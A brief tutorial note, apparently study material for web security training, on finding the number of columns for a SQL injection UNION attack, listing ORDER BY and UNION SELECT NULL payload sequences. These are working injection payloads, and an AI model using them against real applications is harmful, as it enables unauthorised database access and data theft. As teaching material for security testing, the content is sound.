Determining the number of columns required in a SQL injection UNION attack

The first method involves injecting a series of ORDER BY clauses and incrementing the specified column index until an error occurs.
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--


The second method involves submitting a series of UNION SELECT payloads specifying a different number of null values
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
etc.
